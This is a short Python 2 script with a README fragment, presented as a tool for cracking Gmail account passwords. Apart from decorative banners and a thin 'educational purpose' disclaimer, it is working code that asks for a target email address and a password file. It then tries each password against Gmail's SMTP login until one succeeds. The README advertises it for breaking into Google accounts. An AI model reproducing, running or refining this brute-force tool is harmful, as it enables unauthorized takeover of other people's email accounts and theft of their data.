# Program: Gmail Dictionary Attack v2

print"Join Ethical Hacker's Community"
#Information
print "Author: Kinghacker0"
print "Gmail Haçk- www.YouTube.com/Hacker's King "
print "Website - www.hackersking.in"

print"      *                                            *   "
print"     *                                              *    "
print"    **                                              **   "
print"   *   **                                        **   *    "
print"   **   **  *                               *   **    **   "
print"   ***    * **    Google password-@kinghacker0   **  *    ***  "
print"    ****    ******************************* ***   ****   "
print"       *******    *****        *******    **********  "
print"  ***********           *****             ************     "
print"    **********    *** * **   ** ****    **********     "
print"         ********** ** **     ** ****************    "
print"   *************** ** **  ***  **  **********************  "
print"        ******   ***************************   ******     "
print"                *************************    "
print"               **************************  "
print"               **** ** ** **** ** ** **  "
print"                ***  *  *  **  *  * ***   "
print"                 **                 **    "
print"                   *                *     "

print" Disclaimer- This tool is only for educational purpose"
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] Password Found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrect: %s" % password# GmailCrack
By using GmailCrack tool you can crack google accounts passwords and it is based on Bruteforce attack with good speed of guessing passwords.
